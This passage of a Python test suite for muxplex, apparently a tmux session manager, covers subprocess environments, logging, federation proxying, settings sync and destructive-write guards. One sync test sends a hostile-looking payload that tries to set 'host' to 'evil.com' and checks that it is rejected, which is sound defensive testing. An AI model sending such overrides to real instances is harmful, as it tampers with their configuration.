    from unittest.mock import AsyncMock, MagicMock

    import muxplex.settings as settings_mod

    monkeypatch.setattr(settings_mod, "SETTINGS_PATH", tmp_path / "no-settings.json")

    sentinel_env = {"TMUX_TMPDIR": "/custom/tmux/socket/dir", "SENTINEL": "1"}
    monkeypatch.setattr("muxplex.sessions.tmux_env", lambda: sentinel_env)

    captured_kwargs = []

    mock_proc = MagicMock()
    mock_proc.communicate = AsyncMock(return_value=(b"", b""))
    mock_proc.returncode = 0

    async def mock_create_subprocess(cmd, **kwargs):
        captured_kwargs.append(kwargs)
        return mock_proc

    async def mock_create_subprocess_exec(*cmd, **kwargs):
        # Separate stub, separate capture list. Sharing one would fold the
        # incidental exec call into captured_kwargs and quietly break the
        # "called exactly once" guard this test relies on.
        return mock_proc

    monkeypatch.setattr(
        "tmux_kit.spawn.asyncio.create_subprocess_shell", mock_create_subprocess
    )
    # The request path also reaches run_tmux(), which uses create_subprocess_exec
    # and really does exec `tmux`. Unmocked, this test depends on a tmux binary
    # being present and on whatever a live tmux server happens to answer --
    # neither of which it is trying to assert. Stub it so the test measures only
    # what its name claims: the env= passed to the shell call. (run_tmux lives
    # in tmux_kit.proc since the S1 extraction, and the spawn body lives
    # in tmux_kit.spawn since S2, so each stub targets THAT module's
    # asyncio binding: proc for run_tmux's exec, spawn for the spawn exec.)
    monkeypatch.setattr(
        "tmux_kit.proc.asyncio.create_subprocess_exec", mock_create_subprocess_exec
    )
    monkeypatch.setattr(
        "tmux_kit.spawn.asyncio.create_subprocess_exec", mock_create_subprocess_exec
    )

    response = client.post("/api/sessions", json={"name": "env-check"})
    assert response.status_code == 200

    assert len(captured_kwargs) == 1, (
        "create_subprocess_shell must be called exactly once"
    )
    assert captured_kwargs[0].get("env") == sentinel_env, (
        "create_session must pass env=tmux_env() to create_subprocess_shell, "
        f"got env={captured_kwargs[0].get('env')!r}"
    )


def test_delete_session_passes_tmux_env_to_subprocess(client, monkeypatch, tmp_path):
    """DELETE /api/sessions/{name} must pass tmux_env() as env= to subprocess.run.

    Regression guard: without this, the delete command (which may itself
    invoke `tmux kill-session` or an external tool that does) silently targets
    the default tmux socket instead of the configured tmux_socket_dir --
    causing the real session to survive while muxplex reports it as deleted.
    """
    from unittest.mock import MagicMock, patch

    import muxplex.settings as settings_mod

    monkeypatch.setattr("muxplex.main.get_session_list", lambda: ["my-session"])
    monkeypatch.setattr(settings_mod, "SETTINGS_PATH", tmp_path / "no-settings.json")

    sentinel_env = {"TMUX_TMPDIR": "/custom/tmux/socket/dir", "SENTINEL": "1"}
    # delete_session() is unchanged by the spawn_session_command() extraction
    # (that refactor only touched CREATE) -- it still calls its own
    # `from muxplex.sessions import tmux_env` binding directly, so the patch
    # target stays muxplex.main.tmux_env, not muxplex.sessions.tmux_env.
    monkeypatch.setattr("muxplex.main.tmux_env", lambda: sentinel_env)

    captured_kwargs = []

    def mock_run(cmd, **kwargs):
        captured_kwargs.append(kwargs)
        result = MagicMock()
        result.returncode = 0
        result.stderr = ""
        return result

    with patch("muxplex.main.subprocess.run", side_effect=mock_run):
        response = client.delete("/api/sessions/my-session")

    assert response.status_code == 200
    assert len(captured_kwargs) == 1, "subprocess.run must be called exactly once"
    assert captured_kwargs[0].get("env") == sentinel_env, (
        "delete_session must pass env=tmux_env() to subprocess.run, "
        f"got env={captured_kwargs[0].get('env')!r}"
    )


# ---------------------------------------------------------------------------
# Bug fix: request-level INFO logging for session operations
# ---------------------------------------------------------------------------


def test_delete_session_logs_command_at_info(client, monkeypatch, tmp_path, caplog):
    """DELETE /api/sessions/{name} must log the command being run at INFO level."""
    import logging
    from unittest.mock import MagicMock, patch

    import muxplex.settings as settings_mod

    monkeypatch.setattr("muxplex.main.get_session_list", lambda: ["logged-session"])
    monkeypatch.setattr(settings_mod, "SETTINGS_PATH", tmp_path / "no-settings.json")

    def mock_run(cmd, **kwargs):
        result = MagicMock()
        result.returncode = 0
        result.stderr = ""
        return result

    with caplog.at_level(logging.INFO, logger="muxplex.main"):
        with patch("muxplex.main.subprocess.run", side_effect=mock_run):
            client.delete("/api/sessions/logged-session")

    log_messages = "\n".join(caplog.messages)
    assert "logged-session" in log_messages, (
        f"delete_session must log the session name at INFO level, got logs:\n{log_messages}"
    )


def test_create_session_logs_command(client, monkeypatch, tmp_path, caplog):
    """POST /api/sessions must log the command being launched at INFO level.

    The actual log call lives in the library's spawn body -- since the S2
    extraction that is `tmux_kit.spawn.spawn_session()` (logger
    "tmux_kit.spawn"), reached via `sessions.spawn_session_command()`
    -- not in main.py's create_session() handler itself, which delegates
    session creation (see that function's docstring: shared with `muxplex
    restore`). Filtering on "muxplex.main" here previously passed only by
    accident: the
    now-deleted `ensure_history_retention()` logged a WARNING containing
    the session name on its (always-triggered, in this mocked test) tmux
    failure path, which is captured regardless of the `at_level` logger
    argument (see caplog's handler-level semantics). That coincidence
    masked this test never actually observing the claimed INFO-level log.
    """
    import logging
    from unittest.mock import AsyncMock, MagicMock

    import muxplex.settings as settings_mod

    monkeypatch.setattr(settings_mod, "SETTINGS_PATH", tmp_path / "no-settings.json")

    mock_proc = MagicMock()
    mock_proc.communicate = AsyncMock(return_value=(b"", b""))
    mock_proc.returncode = 0

    monkeypatch.setattr(
        "tmux_kit.spawn.asyncio.create_subprocess_shell",
        AsyncMock(return_value=mock_proc),
    )

    with caplog.at_level(logging.INFO, logger="tmux_kit.spawn"):
        client.post("/api/sessions", json={"name": "new-session"})

    log_messages = "\n".join(caplog.messages)
    assert "new-session" in log_messages, (
        f"create_session must log session name at INFO level, got logs:\n{log_messages}"
    )


def test_connect_session_logs_session_name(client, monkeypatch, caplog):
    """POST /api/sessions/{name}/connect must log the session name at INFO level."""
    import logging

    monkeypatch.setattr("muxplex.main.get_session_list", lambda: ["target-session"])

    async def mock_ensure_ttyd(name):
        pass

    monkeypatch.setattr("muxplex.main.ensure_ttyd", mock_ensure_ttyd)

    with caplog.at_level(logging.INFO, logger="muxplex.main"):
        client.post("/api/sessions/target-session/connect")

    log_messages = "\n".join(caplog.messages)
    assert "target-session" in log_messages, (
        f"connect_session must log session name at INFO level, got logs:\n{log_messages}"
    )


def test_cli_uvicorn_log_level_is_info():
    """cli.py serve() must pass log_level='info' to uvicorn.run so logs appear in journalctl."""
    import inspect

    from muxplex import cli

    source = inspect.getsource(cli.serve)
    assert 'log_level="info"' in source or "log_level='info'" in source, (
        "serve() must call uvicorn.run(..., log_level='info') so application "
        "logs appear in journalctl; currently set to 'warning' which suppresses them"
    )


# ---------------------------------------------------------------------------
# Federation bell/clear proxy (task-3-federation-bell-clear-proxy)
# ---------------------------------------------------------------------------


def test_federation_bell_clear_proxies_to_remote(client, monkeypatch, tmp_path):
    """POST /api/federation/{remote_id}/sessions/{name}/bell/clear proxies POST to remote's bell/clear endpoint.

    Looks up remote by integer index, sends POST {remote_url}/api/sessions/{session_name}/bell/clear
    with Bearer auth header, and returns the remote's JSON response.
    """
    import json
    from unittest.mock import MagicMock

    import muxplex.settings as settings_mod

    settings_path = tmp_path / "settings.json"
    monkeypatch.setattr(settings_mod, "SETTINGS_PATH", settings_path)

    settings_path.write_text(
        json.dumps(
            {
                "remote_instances": [
                    {
                        "url": "http://remote-host:8088",
                        "key": "secret-key-123",
                        "name": "remote-host",
                        "id": "remote-0",
                    }
                ],
            }
        )
    )

    # Track what POST was called with
    post_calls = []

    async def mock_post(url, **kwargs):
        post_calls.append({"url": url, "kwargs": kwargs})
        mock_resp = MagicMock()
        mock_resp.status_code = 200
        mock_resp.json.return_value = {"cleared": True}
        return mock_resp

    mock_fed_client = MagicMock()
    mock_fed_client.post = mock_post
    monkeypatch.setattr(client.app.state, "federation_client", mock_fed_client)

    response = client.post("/api/federation/0/sessions/my-session/bell/clear")
    assert response.status_code == 200

    # Verify the POST was made to the correct URL with session name
    assert len(post_calls) == 1, f"Expected exactly 1 POST call, got {len(post_calls)}"
    call = post_calls[0]
    assert (
        call["url"] == "http://remote-host:8088/api/sessions/my-session/bell/clear"
    ), f"Expected POST to remote bell/clear URL, got: {call['url']}"

    # Verify Bearer auth was included
    headers = call["kwargs"].get("headers", {})
    assert headers.get("Authorization") == "Bearer secret-key-123", (
        f"Expected Bearer auth header, got: {headers}"
    )

    # Verify the response is the remote's JSON
    data = response.json()
    assert data["cleared"] is True


def test_federation_bell_clear_returns_404_for_invalid_remote(
    client, monkeypatch, tmp_path
):
    """POST /api/federation/{remote_id}/sessions/{name}/bell/clear returns 404 when remote_id is out of range."""
    import json

    import muxplex.settings as settings_mod

    settings_path = tmp_path / "settings.json"
    monkeypatch.setattr(settings_mod, "SETTINGS_PATH", settings_path)

    # No remote instances configured
    settings_path.write_text(json.dumps({"remote_instances": []}))

    response = client.post("/api/federation/0/sessions/my-session/bell/clear")
    assert response.status_code == 404


def test_federation_create_session_proxies_to_remote(client, monkeypatch, tmp_path):
    """POST /api/federation/{remote_id}/sessions proxies POST to remote's /api/sessions endpoint.

    Looks up remote by integer index, sends POST {remote_url}/api/sessions with Bearer auth
    header and JSON body {name: ...}, and returns the remote's JSON response.
    """
    import json
    from unittest.mock import MagicMock

    import muxplex.settings as settings_mod

    settings_path = tmp_path / "settings.json"
    monkeypatch.setattr(settings_mod, "SETTINGS_PATH", settings_path)

    settings_path.write_text(
        json.dumps(
            {
                "remote_instances": [
                    {
                        "url": "http://remote-host:8088",
                        "key": "secret-key-123",
                        "name": "remote-host",
                        "id": "remote-0",
                    }
                ],
            }
        )
    )

    # Track what POST was called with
    post_calls = []

    async def mock_post(url, **kwargs):
        post_calls.append({"url": url, "kwargs": kwargs})
        mock_resp = MagicMock()
        mock_resp.status_code = 200
        mock_resp.json.return_value = {"name": "new-session", "pid": 12345}
        return mock_resp

    mock_fed_client = MagicMock()
    mock_fed_client.post = mock_post
    monkeypatch.setattr(client.app.state, "federation_client", mock_fed_client)

    response = client.post("/api/federation/0/sessions", json={"name": "new-session"})
    assert response.status_code == 200

    # Verify the POST was made to the correct remote URL
    assert len(post_calls) == 1, f"Expected exactly 1 POST call, got {len(post_calls)}"
    call = post_calls[0]
    assert call["url"] == "http://remote-host:8088/api/sessions", (
        f"Expected POST to remote /api/sessions URL, got: {call['url']}"
    )

    # Verify Bearer auth was included
    headers = call["kwargs"].get("headers", {})
    assert headers.get("Authorization") == "Bearer secret-key-123", (
        f"Expected Bearer auth header, got: {headers}"
    )

    # Verify JSON body was forwarded
    json_body = call["kwargs"].get("json", {})
    assert json_body.get("name") == "new-session", (
        f"Expected JSON body with name='new-session', got: {json_body}"
    )

    # Verify the response is the remote's JSON
    data = response.json()
    assert data["name"] == "new-session"
    assert data["pid"] == 12345


def test_federation_create_session_returns_404_for_invalid_remote(
    client, monkeypatch, tmp_path
):
    """POST /api/federation/{remote_id}/sessions returns 404 when remote_id is out of range."""
    import json

    import muxplex.settings as settings_mod

    settings_path = tmp_path / "settings.json"
    monkeypatch.setattr(settings_mod, "SETTINGS_PATH", settings_path)

    # No remote instances configured
    settings_path.write_text(json.dumps({"remote_instances": []}))

    response = client.post("/api/federation/0/sessions", json={"name": "new-session"})
    assert response.status_code == 404


def test_federation_create_session_returns_503_when_remote_unreachable(
    client, monkeypatch, tmp_path
):
    """POST /api/federation/{remote_id}/sessions returns 503 when remote is unreachable.

    If the outbound http_client.post() raises a network-level exception (e.g. ConnectError),
    the endpoint must return 503 rather than propagating a raw 500.
    """
    import json
    from unittest.mock import MagicMock

    import httpx

    import muxplex.settings as settings_mod

    settings_path = tmp_path / "settings.json"
    monkeypatch.setattr(settings_mod, "SETTINGS_PATH", settings_path)
    settings_path.write_text(
        json.dumps(
            {
                "remote_instances": [
                    {
                        "url": "http://remote-host:8088",
                        "key": "secret-key-123",
                        "name": "remote-host",
                        "id": "remote-0",
                    }
                ],
            }
        )
    )

    async def mock_post_unreachable(*args, **kwargs):
        raise httpx.ConnectError("Connection refused")

    mock_fed_client = MagicMock()
    mock_fed_client.post = mock_post_unreachable
    monkeypatch.setattr(client.app.state, "federation_client", mock_fed_client)

    response = client.post("/api/federation/0/sessions", json={"name": "new-session"})
    assert response.status_code == 503


def test_federation_create_session_returns_502_when_remote_returns_error(
    client, monkeypatch, tmp_path
):
    """POST /api/federation/{remote_id}/sessions returns 502 when remote returns HTTP error.

    If the outbound http_client.post() returns a non-2xx response that raises HTTPStatusError
    (via raise_for_status), the endpoint must return 502 with the upstream status code in detail.
    """
    import json
    from unittest.mock import MagicMock

    import httpx

    import muxplex.settings as settings_mod

    settings_path = tmp_path / "settings.json"
    monkeypatch.setattr(settings_mod, "SETTINGS_PATH", settings_path)
    settings_path.write_text(
        json.dumps(
            {
                "remote_instances": [
                    {
                        "url": "http://remote-host:8088",
                        "key": "secret-key-123",
                        "name": "remote-host",
                        "id": "remote-0",
                    }
                ],
            }
        )
    )

    async def mock_post_error(*args, **kwargs):
        mock_response = MagicMock(spec=httpx.Response)
        mock_response.status_code = 422
        raise httpx.HTTPStatusError(
            "Unprocessable Entity",
            request=MagicMock(),
            response=mock_response,
        )

    mock_fed_client = MagicMock()
    mock_fed_client.post = mock_post_error
    monkeypatch.setattr(client.app.state, "federation_client", mock_fed_client)

    response = client.post("/api/federation/0/sessions", json={"name": "new-session"})
    assert response.status_code == 502


# ---------------------------------------------------------------------------
# Federation Authorization header safety — guard against empty key
# ---------------------------------------------------------------------------


# ---------------------------------------------------------------------------
# Poll cycle federation bell clear (task-3)
# ---------------------------------------------------------------------------


async def test_poll_cycle_fires_federation_bell_clear_for_remote_session(
    monkeypatch, tmp_path
):
    """_run_poll_cycle() fires POST bell/clear to remote when a device is viewing a remote session.

    Sets up state with active_remote_id=0, one device viewing 'build' in fullscreen
    with a recent interaction timestamp, mocks the module-level _federation_client,
    runs one poll cycle, and verifies mock_client.post was called with the correct
    URL and Bearer auth header.
    """
    import json
    import time
    from unittest.mock import MagicMock

    import muxplex.main as main_mod
    import muxplex.settings as settings_mod
    from muxplex.state import save_state

    # Set up settings with one remote instance at index 0
    settings_path = tmp_path / "settings.json"
    settings_path.write_text(
        json.dumps(
            {
                "remote_instances": [
                    {
                        "url": "http://remote-host:8088",
                        "key": "test-key",
                        "name": "remote-host",
                    }
                ]
            }
        )
    )
    monkeypatch.setattr(settings_mod, "SETTINGS_PATH", settings_path)

    # Set up state with active_remote_id=0, one device viewing 'build' in fullscreen
    state = {
        "active_session": None,
        "active_remote_id": 0,
        "session_order": ["build"],
        "sessions": {
            "build": {
                "bell": {"last_fired_at": None, "seen_at": None, "unseen_count": 0}
            }
        },
        "devices": {
            "dev-1": {
                "label": "My Device",
                "viewing_session": "build",
                "view_mode": "fullscreen",
                "last_interaction_at": time.time(),
                "last_heartbeat_at": time.time(),
            }
        },
    }
    save_state(state)

    # Mock all poll-cycle dependencies so the cycle completes without real tmux
    async def mock_enumerate():
        return ["build"]

    async def mock_snapshot_all(names):
        return {"build": "pane text"}

    async def mock_process_bell_flags(names, state, on_transition=None):
        pass

    monkeypatch.setattr("muxplex.main.enumerate_sessions", mock_enumerate)
    monkeypatch.setattr("muxplex.main.snapshot_all", mock_snapshot_all)
    monkeypatch.setattr(
        "muxplex.main.update_session_cache", lambda names, snapshots: None
    )
    monkeypatch.setattr("muxplex.main.apply_bell_clear_rule", lambda state: None)
    monkeypatch.setattr("muxplex.main.prune_devices", lambda state: None)
    monkeypatch.setattr("muxplex.main.process_bell_flags", mock_process_bell_flags)

    # Capture POST calls from the mocked federation client
    post_calls: list[dict] = []

    async def mock_post(url, **kwargs):
        post_calls.append({"url": url, "kwargs": kwargs})
        resp = MagicMock()
        resp.status_code = 200
        return resp

    mock_client = MagicMock()
    mock_client.post = mock_post
    monkeypatch.setattr(main_mod, "_federation_client", mock_client)

    # Run one poll cycle
    await main_mod._run_poll_cycle()

    # Verify mock_client.post was called exactly once with the correct URL and auth
    assert len(post_calls) == 1, (
        f"Expected exactly 1 POST call to remote bell/clear, got {len(post_calls)}: {post_calls}"
    )
    call = post_calls[0]
    assert "/api/sessions/build/bell/clear" in call["url"], (
        f"Expected URL to contain '/api/sessions/build/bell/clear', got: {call['url']}"
    )
    headers = call["kwargs"].get("headers", {})
    assert headers.get("Authorization") == "Bearer test-key", (
        f"Expected 'Authorization: Bearer test-key' header, got: {headers}"
    )


async def test_poll_cycle_fires_federation_bell_clear_for_remote_session_with_uuid(
    monkeypatch, tmp_path
):
    """_run_poll_cycle() fires bell/clear when active_remote_id is a UUID string.

    Regression test for the bug where isinstance(active_remote_id, int) was
    always False for UUID strings, silently skipping the bell-clear POST.

    Sets up state with active_remote_id="dead-beef-uuid", remote instance has
    device_id="dead-beef-uuid", one device viewing 'build' in fullscreen with
    a recent interaction. Verifies mock_client.post is called with the correct
    URL and Bearer auth header.
    """
    import json
    import time
    from unittest.mock import MagicMock

    import muxplex.main as main_mod
    import muxplex.settings as settings_mod
    from muxplex.state import save_state

    remote_uuid = "dead-beef-uuid-1234-abcd"

    # Set up settings with one remote instance that has a device_id
    settings_path = tmp_path / "settings.json"
    settings_path.write_text(
        json.dumps(
            {
                "remote_instances": [
                    {
                        "url": "http://remote-host:8088",
                        "key": "uuid-key",
                        "name": "remote-host",
                        "device_id": remote_uuid,
                    }
                ]
            }
        )
    )
    monkeypatch.setattr(settings_mod, "SETTINGS_PATH", settings_path)

    # Set up state with active_remote_id as a UUID string (not an integer)
    state = {
        "active_session": None,
        "active_remote_id": remote_uuid,
        "session_order": ["build"],
        "sessions": {
            "build": {
                "bell": {"last_fired_at": None, "seen_at": None, "unseen_count": 0}
            }
        },
        "devices": {
            "dev-1": {
                "label": "My Device",
                "viewing_session": "build",
                "view_mode": "fullscreen",
                "last_interaction_at": time.time(),
                "last_heartbeat_at": time.time(),
            }
        },
    }
    save_state(state)

    # Mock all poll-cycle dependencies so the cycle completes without real tmux
    async def mock_enumerate():
        return ["build"]

    async def mock_snapshot_all(names):
        return {"build": "pane text"}

    async def mock_process_bell_flags(names, state, on_transition=None):
        pass

    monkeypatch.setattr("muxplex.main.enumerate_sessions", mock_enumerate)
    monkeypatch.setattr("muxplex.main.snapshot_all", mock_snapshot_all)
    monkeypatch.setattr(
        "muxplex.main.update_session_cache", lambda names, snapshots: None
    )
    monkeypatch.setattr("muxplex.main.apply_bell_clear_rule", lambda state: None)
    monkeypatch.setattr("muxplex.main.prune_devices", lambda state: None)
    monkeypatch.setattr("muxplex.main.process_bell_flags", mock_process_bell_flags)

    # Capture POST calls from the mocked federation client
    post_calls: list[dict] = []

    async def mock_post(url, **kwargs):
        post_calls.append({"url": url, "kwargs": kwargs})
        resp = MagicMock()
        resp.status_code = 200
        return resp

    mock_client = MagicMock()
    mock_client.post = mock_post
    monkeypatch.setattr(main_mod, "_federation_client", mock_client)

    # Run one poll cycle
    await main_mod._run_poll_cycle()

    # Verify mock_client.post was called — the isinstance bug causes 0 calls
    assert len(post_calls) == 1, (
        f"Expected exactly 1 POST call to remote bell/clear (UUID active_remote_id), "
        f"got {len(post_calls)}: {post_calls}. "
        f"This indicates the isinstance(active_remote_id, int) guard is still present."
    )
    call = post_calls[0]
    assert "/api/sessions/build/bell/clear" in call["url"], (
        f"Expected URL to contain '/api/sessions/build/bell/clear', got: {call['url']}"
    )
    headers = call["kwargs"].get("headers", {})
    assert headers.get("Authorization") == "Bearer uuid-key", (
        f"Expected 'Authorization: Bearer uuid-key' header, got: {headers}"
    )


# ---------------------------------------------------------------------------
# GET /api/settings/sync (task-7)
# ---------------------------------------------------------------------------


def test_settings_sync_returns_200(client, tmp_path, monkeypatch):
    """GET /api/settings/sync returns HTTP 200."""
    import muxplex.settings as settings_mod

    monkeypatch.setattr(settings_mod, "SETTINGS_PATH", tmp_path / "settings.json")
    response = client.get("/api/settings/sync")
    assert response.status_code == 200


def test_settings_sync_response_has_settings_and_timestamp(
    client, tmp_path, monkeypatch
):
    """GET /api/settings/sync returns {settings: dict, settings_updated_at: float}."""
    import muxplex.settings as settings_mod

    monkeypatch.setattr(settings_mod, "SETTINGS_PATH", tmp_path / "settings.json")
    response = client.get("/api/settings/sync")
    assert response.status_code == 200
    data = response.json()
    assert "settings" in data, (
        f"Response must have 'settings' key, got: {list(data.keys())}"
    )
    assert "settings_updated_at" in data, (
        f"Response must have 'settings_updated_at' key, got: {list(data.keys())}"
    )
    assert isinstance(data["settings"], dict), (
        f"'settings' must be a dict, got: {type(data['settings'])}"
    )
    assert isinstance(data["settings_updated_at"], float), (
        f"'settings_updated_at' must be a float, got: {type(data['settings_updated_at'])}"
    )


def test_settings_sync_excludes_infrastructure_keys(client, tmp_path, monkeypatch):
    """GET /api/settings/sync settings dict must not contain infrastructure keys."""
    import muxplex.settings as settings_mod

    monkeypatch.setattr(settings_mod, "SETTINGS_PATH", tmp_path / "settings.json")
    response = client.get("/api/settings/sync")
    assert response.status_code == 200
    settings = response.json()["settings"]
    infra_keys = (
        "host",
        "port",
        "auth",
        "session_ttl",
        "tls_cert",
        "tls_key",
        "device_name",
        "federation_key",
        "remote_instances",
        "multi_device_enabled",
        "new_session_template",
        "delete_session_template",
    )
    for key in infra_keys:
        assert key not in settings, (
            f"Infrastructure key '{key}' must not appear in /api/settings/sync response"
        )


def test_federation_auth_headers_guard_empty_key():
    """Every federation Authorization header construction must guard against empty key.

    An empty remote_instances[].key produces 'Bearer ' (trailing space, empty
    token).  httpx rejects that with "Illegal header value b'Bearer '" which
    silently makes the remote appear unreachable.

    The fix: every site that constructs the header must use the pattern
        headers={"Authorization": f"Bearer {key}"} if key else {}
    or an equivalent conditional, so an empty key simply omits the header.

    This is a source-inspection test — it catches regressions without spinning
    up a live server.
    """
    import inspect

    import muxplex.main as main_mod

    source = inspect.getsource(main_mod)

    # Collect every line that constructs an Authorization Bearer header (not
    # comment or docstring lines — we only care about executable code lines).
    offending: list[str] = []
    for line in source.splitlines():
        stripped = line.strip()
        # Skip comment and docstring lines
        if (
            stripped.startswith("#")
            or stripped.startswith('"""')
            or stripped.startswith("'\"'\"'")
        ):
            continue
        # Match lines that build the header dict value
        if (
            '"Authorization"' in stripped
            and "Bearer" in stripped
            and 'f"Bearer' in stripped
        ):
            # Must have an inline `if` guard — e.g. `{...} if key else {}`
            if " if " not in stripped:
                offending.append(stripped)

    assert not offending, (
        "Unguarded federation Bearer header(s) found in main.py — "
        "use `{...} if key else {}` to skip the header when key is empty:\n"
        + "\n".join(f"  {line}" for line in offending)
    )


# ---------------------------------------------------------------------------
# PUT /api/settings/sync (task-8)
# ---------------------------------------------------------------------------


def test_put_settings_sync_applies_when_newer(client, tmp_path, monkeypatch):
    """PUT /api/settings/sync applies settings when incoming timestamp is newer."""
    import json

    import muxplex.settings as settings_mod

    settings_path = tmp_path / "settings.json"
    monkeypatch.setattr(settings_mod, "SETTINGS_PATH", settings_path)

    # Set local timestamp to something old
    settings_path.write_text(json.dumps({"settings_updated_at": 1000.0}))

    response = client.put(
        "/api/settings/sync",
        json={"settings": {"fontSize": 20}, "settings_updated_at": 2000.0},
    )
    assert response.status_code == 200
    data = response.json()
    assert "settings" in data, f"Response must have 'settings' key, got: {data}"
    assert "settings_updated_at" in data, (
        f"Response must have 'settings_updated_at' key, got: {data}"
    )
    assert data["settings_updated_at"] == 2000.0, (
        f"Timestamp must be 2000.0, got: {data['settings_updated_at']}"
    )
    assert data["settings"]["fontSize"] == 20, (
        f"fontSize must be 20, got: {data['settings'].get('fontSize')}"
    )


def test_put_settings_sync_rejects_when_older(client, tmp_path, monkeypatch):
    """PUT /api/settings/sync returns 409 when incoming timestamp is older."""
    import json

    import muxplex.settings as settings_mod

    settings_path = tmp_path / "settings.json"
    monkeypatch.setattr(settings_mod, "SETTINGS_PATH", settings_path)

    # Set local timestamp to something newer than the incoming
    settings_path.write_text(json.dumps({"settings_updated_at": 2000.0}))

    response = client.put(
        "/api/settings/sync",
        json={"settings": {"fontSize": 18}, "settings_updated_at": 1000.0},
    )
    assert response.status_code == 409
    data = response.json()
    assert "settings" in data, f"409 body must have 'settings' key, got: {data}"
    assert "settings_updated_at" in data, (
        f"409 body must have 'settings_updated_at' key, got: {data}"
    )
    # Should return local state, which has the newer timestamp
    assert data["settings_updated_at"] == 2000.0, (
        f"409 body must return local timestamp 2000.0, got: {data['settings_updated_at']}"
    )


def test_put_settings_sync_rejects_when_equal(client, tmp_path, monkeypatch):
    """PUT /api/settings/sync returns 409 when timestamps are equal."""
    import json

    import muxplex.settings as settings_mod

    settings_path = tmp_path / "settings.json"
    monkeypatch.setattr(settings_mod, "SETTINGS_PATH", settings_path)

    # Set local timestamp
    settings_path.write_text(json.dumps({"settings_updated_at": 1500.0}))

    response = client.put(
        "/api/settings/sync",
        json={"settings": {"fontSize": 16}, "settings_updated_at": 1500.0},
    )
    assert response.status_code == 409, (
        f"Equal timestamps must return 409, got {response.status_code}"
    )
    data = response.json()
    assert data["settings_updated_at"] == 1500.0, (
        f"409 body must return local timestamp 1500.0, got: {data.get('settings_updated_at')}"
    )


def test_put_settings_sync_ignores_nonsyncable_keys(client, tmp_path, monkeypatch):
    """PUT /api/settings/sync does not apply non-syncable keys like host."""
    import json

    import muxplex.settings as settings_mod

    settings_path = tmp_path / "settings.json"
    monkeypatch.setattr(settings_mod, "SETTINGS_PATH", settings_path)

    # Start with default settings (host defaults to "127.0.0.1")
    settings_path.write_text(json.dumps({"settings_updated_at": 0.0}))

    response = client.put(
        "/api/settings/sync",
        json={
            "settings": {"fontSize": 20, "host": "evil.com"},
            "settings_updated_at": 9999999999.0,
        },
    )
    assert response.status_code == 200

    # Verify fontSize (syncable) was changed
    local = settings_mod.load_settings()
    assert local["fontSize"] == 20, (
        f"Syncable key 'fontSize' must be updated to 20, got: {local['fontSize']}"
    )

    # Verify host (non-syncable) was NOT changed
    assert local["host"] == "127.0.0.1", (
        f"Non-syncable key 'host' must remain '127.0.0.1', got: {local['host']}"
    )


# ---------------------------------------------------------------------------
# Destructive-write backstop (settings clobber incident, 2026-07)
# ---------------------------------------------------------------------------


def _views(n, sessions_per_view=2):
    return [
        {"name": f"v{i}", "sessions": [f"s{i}-{j}" for j in range(sessions_per_view)]}
        for i in range(n)
    ]


def test_patch_settings_rejects_destructive_views_collapse_via_api(
    client, tmp_path, monkeypatch
):
    """PATCH /api/settings with an 8->1 views collapse returns 409, no write."""
    import muxplex.settings as settings_mod

    monkeypatch.setattr(settings_mod, "SETTINGS_PATH", tmp_path / "settings.json")
    client.patch("/api/settings", json={"views": _views(8)})

    response = client.patch("/api/settings", json={"views": [_views(8)[0]]})

    assert response.status_code == 409
    body = response.json()
    assert body["backstop"] is True
    assert "counts" in body
    assert body["counts"]["before_views"] == 8
    assert body["counts"]["after_views"] == 1

    # No write happened.
    after = client.get("/api/settings").json()
    assert len(after["views"]) == 8


def test_patch_settings_allow_destructive_true_permits_collapse_via_api(
    client, tmp_path, monkeypatch
):
    """PATCH /api/settings with allow_destructive: true permits an intentional collapse."""
    import muxplex.settings as settings_mod

    monkeypatch.setattr(settings_mod, "SETTINGS_PATH", tmp_path / "settings.json")
    client.patch("/api/settings", json={"views": _views(8)})

    response = client.patch(
        "/api/settings",
        json={"views": [_views(8)[0]], "allow_destructive": True},
    )

    assert response.status_code == 200
    assert len(response.json()["views"]) == 1


def test_patch_settings_single_view_deletion_via_api_is_unaffected(
    client, tmp_path, monkeypatch
):
    """Deleting one of 8 views via the real API endpoint is not flagged destructive."""
    import muxplex.settings as settings_mod

    monkeypatch.setattr(settings_mod, "SETTINGS_PATH", tmp_path / "settings.json")
    client.patch("/api/settings", json={"views": _views(8)})

    response = client.patch("/api/settings", json={"views": _views(8)[1:]})

    assert response.status_code == 200
    assert len(response.json()["views"]) == 7


# ---------------------------------------------------------------------------
# Rule editor (§9.3) x destructive-write backstop: a normal "add a rule to
# an existing manual view" write must never trip DESTRUCTIVE_MEMBER_DROP_RATIO
# -- the editor only ever sets match_names, never touches sessions (the
# union design, docs/plans/2026-08-04-auto-views-plan.md §2.2/§0.4). Converting a pile of pins to
# a rule by unchecking each pin individually (the existing Manage View
# checkboxes) is likewise always a single-member-at-a-time write. Only a
# ONE-SHOT bulk rewrite that shrinks match_names dramatically on an
# otherwise-dominant view can still trip the backstop -- that's the backstop
# working as designed, not a bug in the editor, and is asserted below too so
# the boundary is documented rather than silently assumed.
# ---------------------------------------------------------------------------


def test_patch_settings_editor_adds_rule_to_20_pin_view_is_not_destructive(
    client, tmp_path, monkeypatch
):
    """The rule editor's write shape: same `sessions` (20 pins, untouched),
    new `match_names` added. This is the exact write pattern
    _renderManageViewRuleEditor's save button issues -- must never 409."""
    import muxplex.settings as settings_mod

    monkeypatch.setattr(settings_mod, "SETTINGS_PATH", tmp_path / "settings.json")
    pinned = [f"dev1:s{i}" for i in range(20)]
    client.patch("/api/settings", json={"views": [{"name": "V", "sessions": pinned}]})

    response = client.patch(
        "/api/settings",
        json={
            "views": [{"name": "V", "sessions": pinned, "match_names": ["amplifier-*"]}]
        },
    )

    assert response.status_code == 200
    assert response.json()["views"][0]["match_names"] == ["amplifier-*"]
    assert response.json()["views"][0]["sessions"] == pinned


def test_patch_settings_editor_incremental_pin_removal_never_trips_backstop(
    client, tmp_path, monkeypatch
):
    """The 'convert a pile of pins into one rule' workflow this task
    describes happens one checkbox at a time (existing Manage View list
    behavior, unchanged by this task). Down to the LAST pin (20 -> 1), each
    single-pin removal against a 20-pin view is far under the 50%
    total-member drop ratio. The very last pin (1 -> 0, i.e. 2 total
    members -> 1) is a separate, documented edge case -- see
    test_patch_settings_last_member_removal_can_trip_backstop_even_incrementally
    below -- deliberately NOT exercised here."""
    import muxplex.settings as settings_mod

    monkeypatch.setattr(settings_mod, "SETTINGS_PATH", tmp_path / "settings.json")
    pinned = [f"dev1:s{i}" for i in range(20)]
    client.patch(
        "/api/settings",
        json={
